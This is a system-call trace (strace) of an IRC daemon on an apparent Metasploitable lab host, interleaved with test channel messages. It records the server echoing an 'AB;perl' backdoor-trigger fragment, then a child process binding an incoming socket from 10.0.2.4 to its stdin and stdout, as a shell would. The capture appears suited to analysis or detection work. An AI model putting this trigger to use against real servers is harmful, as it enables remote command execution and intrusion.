18437 12:54:35.967382 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 18439
18437 12:54:35.967403 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.967415 --- SIGCHLD (Child exited) @ 0 (0) ---
18437 12:54:35.967424 waitpid(-1, 0xbfcbd038, WNOHANG) = -1 ECHILD (No child processes)
18437 12:54:35.967436 sigreturn()       = ? (mask now [])
18437 12:54:35.967452 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
18437 12:54:35.967497 exit_group(0)     = ?
4519  12:54:35.967535 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 18437
4519  12:54:35.967547 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  12:54:35.967562 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  12:54:35.967573 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  12:54:35.967583 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  12:54:35.967601 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  12:54:35.967665 time(NULL)        = 1495644875
4519  12:54:35.967676 time(NULL)        = 1495644875
4519  12:54:35.967689 gettimeofday({1495644875, 967693}, NULL) = 0
4519  12:54:35.967703 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:54:35.967734 clock_gettime(CLOCK_MONOTONIC, {21685, 784747620}) = 0
4519  12:54:35.967747 gettimeofday({1495644875, 967751}, NULL) = 0
4519  12:54:35.967758 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [8], left {1, 0})
4519  12:54:35.967810 clock_gettime(CLOCK_MONOTONIC, {21685, 784822955}) = 0
4519  12:54:35.967822 recv(8, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  12:54:35.967848 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967867 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967882 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967897 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967910 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967925 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967938 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967952 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967966 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967984 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.967998 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968012 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968025 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968039 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968052 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968066 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968079 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968093 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968107 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968122 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968136 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968150 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:35.968168 gettimeofday({1495644875, 968172}, NULL) = 0
4519  12:54:35.968180 select(1024, [2 3 4 5 6 8], [], NULL, {1, 0} <unfinished ...>
18440 12:54:36.043729 <... accept resumed> {sa_family=AF_INET, sin_port=htons(44043), sin_addr=inet_addr("10.0.2.4")}, [16]) = 9
18440 12:54:36.043815 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77908) = -1 EINVAL (Invalid argument)
18440 12:54:36.043865 _llseek(9, 0, 0xbff77950, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:36.043877 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77908) = -1 EINVAL (Invalid argument)
18440 12:54:36.043888 _llseek(9, 0, 0xbff77950, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:36.043898 fcntl64(9, F_SETFD, FD_CLOEXEC) = 0
18440 12:54:36.043942 close(7)          = 0
18440 12:54:36.044013 dup(9)            = 7
18440 12:54:36.044026 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff787a8) = -1 EINVAL (Invalid argument)
18440 12:54:36.044038 _llseek(7, 0, 0xbff787f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:36.044048 fstat64(7, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
18440 12:54:36.044068 dup2(7, 1)        = 1
18440 12:54:36.044079 close(7)          = 0
18440 12:54:36.044091 fcntl64(1, F_SETFD, 0) = 0
18440 12:54:36.044101 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78778) = -1 EINVAL (Invalid argument)
18440 12:54:36.044111 _llseek(1, 0, 0xbff787c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:36.044140 dup(9)            = 7
18440 12:54:36.044152 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff787a8) = -1 EINVAL (Invalid argument)
18440 12:54:36.044163 _llseek(7, 0, 0xbff787f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18440 12:54:36.044173 fstat64(7, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
18440 12:54:36.044189 dup2(7, 0)        = 0
18440 12:54:36.044200 close(7)          = 0
18440 12:54:36.044209 fcntl64(0, F_SETFD, 0) = 0
18440 12:54:36.044309 fcntl64(0, F_SETFD, 0) = 0
18440 12:54:36.044353 read(0,  <unfinished ...>
4519  12:54:36.044682 <... select resumed> ) = 1 (in [5], left {0, 930000})
4519  12:54:36.044707 clock_gettime(CLOCK_MONOTONIC, {21685, 861720464}) = 0
4519  12:54:36.044721 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  12:54:36.044734 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  12:54:36.044755 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  12:54:36.044772 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  12:54:36.044848 close(5)          = 0
4519  12:54:36.044863 time(NULL)        = 1495644876
4519  12:54:36.044874 time(NULL)        = 1495644876
4519  12:54:36.044905 gettimeofday({1495644876, 44909}, NULL) = 0
4519  12:54:36.044917 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:54:36.044947 clock_gettime(CLOCK_MONOTONIC, {21685, 861966785}) = 0
4519  12:54:36.044965 gettimeofday({1495644876, 44968}, NULL) = 0
4519  12:54:36.044975 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [8], left {0, 920000})
4519  12:54:36.117258 clock_gettime(CLOCK_MONOTONIC, {21685, 934298130}) = 0
4519  12:54:36.117331 recv(8, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  12:54:36.117379 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117412 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117437 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117454 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117468 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117482 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117496 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117510 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117523 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117537 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117551 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117564 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117578 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117592 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117605 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117619 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117633 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117646 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117660 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117674 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117688 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117701 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.117732 gettimeofday({1495644876, 117736}, NULL) = 0
4519  12:54:36.117744 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [4], left {0, 930000})
4519  12:54:36.186792 clock_gettime(CLOCK_MONOTONIC, {21686, 3801582}) = 0
4519  12:54:36.186793 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  12:54:36.186793 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186793 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186793 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186794 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186794 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186794 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186794 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186794 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186795 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186795 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186804 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186818 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186832 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186854 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186868 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186881 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186895 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186921 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186936 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186950 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186964 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186977 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.186994 time(NULL)        = 1495644876
4519  12:54:36.187004 time(NULL)        = 1495644876
4519  12:54:36.187015 gettimeofday({1495644876, 187019}, NULL) = 0
4519  12:54:36.187027 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:54:36.187056 clock_gettime(CLOCK_MONOTONIC, {21686, 4069535}) = 0
4519  12:54:36.187067 gettimeofday({1495644876, 187071}, NULL) = 0
4519  12:54:36.187078 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [8], left {0, 810000})
4519  12:54:36.376719 clock_gettime(CLOCK_MONOTONIC, {21686, 193727840}) = 0
4519  12:54:36.376719 recv(8, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  12:54:36.376719 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376719 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376720 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376735 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376749 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376762 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376775 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376789 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376802 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376815 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376828 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376841 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376855 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376868 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376881 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376894 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376907 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376920 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376947 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.376990 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.377003 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.377032 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 10000}, ...}) = 0
4519  12:54:36.377048 gettimeofday({1495644876, 377052}, NULL) = 0
4519  12:54:36.377060 select(1024, [2 3 4 6 8], [], NULL, {1, 0} <unfinished ...>
18440 12:54:36.568604 <... read resumed> "", 4096) = 0
18440 12:54:36.568787 close(9)          = 0
18440 12:54:36.569032 exit_group(0)     = ?
